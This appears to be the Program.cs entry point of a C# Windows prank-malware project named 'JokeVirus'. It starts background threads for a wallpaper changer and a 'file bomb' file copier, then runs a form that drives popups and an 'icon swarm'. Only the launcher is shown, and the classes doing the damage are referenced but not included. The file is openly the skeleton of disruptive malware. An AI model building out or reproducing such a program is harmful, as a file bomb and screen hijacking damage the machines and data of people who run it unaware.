// language: C#, file: Program.cs, target: Windows 10/11, .NET 6, x64
// entry point — spins background workers then hands control to WinForms message loop

using System;
using System.Threading;
using System.Windows.Forms;

namespace JokeVirus
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Non-UI chaos: wallpaper + file bomb on background threads
            new Thread(WallpaperChanger.Run) { IsBackground = true, Name = "WallThread" }.Start();
            new Thread(FileCopier.Run)       { IsBackground = true, Name = "CopyThread" }.Start();

            // All UI chaos (popups, icon swarm) driven by the main STA thread
            Application.Run(new Orchestrator());
        }
    }
}
